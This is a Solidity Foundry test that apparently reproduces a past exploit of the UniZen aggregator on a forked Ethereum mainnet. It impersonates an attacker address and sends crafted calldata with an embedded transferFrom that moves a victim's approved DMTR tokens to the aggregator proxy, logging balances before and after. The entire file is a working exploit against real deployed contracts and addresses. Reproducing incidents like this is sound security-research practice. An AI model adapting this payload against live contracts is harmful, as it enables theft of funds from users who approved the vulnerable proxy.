// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

address constant victim = address(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a);
address constant attacker = address(0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df);
address constant aggregator_proxy = address(
    0xd3f64BAa732061F8B3626ee44bab354f854877AC
);
IERC20 constant DMTR = IERC20(0x51cB253744189f11241becb29BeDd3F1b5384fdB);

contract UniZenIOTest is Test {
    function setUp() public {
        // vm.createSelectFork(
        //     "mainnet",
        //     hex"923d1d63a1165ebd3521516f6d22d015f2e1b4b22d5dc954152b6c089c765fcd"
        // );
        vm.createSelectFork("mainnet", 19393770 - 1);

        print("Before, victim DMTR amount", DMTR.balanceOf(victim), 18);
        print(
            "Before, victim approved DMTR amount on UnizenAggregator",
            DMTR.allowance(victim, address(aggregator_proxy)),
            18
        );
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        (bool ok, ) = aggregator_proxy.call{value: 1}(
            hex"1ef29a02000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002ad8aed847e8d4d3da52aabb7d0f5c25729d10df000000000000000000000000000000000000000000000000000000000000000000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000297963e6c9965e0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000110000000000000000000000000000000000000000000000000000000000000753000000000000000000000000000000000000000000000000000000000000000a554e495a454e2d434c49000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000007feaee6094b8b630de3f7202d04c33f3bdc3828a000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac0000000000000000000000000000000000000000000000023128cfbd15ed72f600000000000000000000000000000000000000000000000000000000"
        );
        require(ok, "Call failed");

        print("After, victim DMTR amount", DMTR.balanceOf(victim), 18);
        print(
            "After, victim approved DMTR amount on UnizenAggregator",
            DMTR.allowance(victim, address(aggregator_proxy)),
            18
        );
    }
}
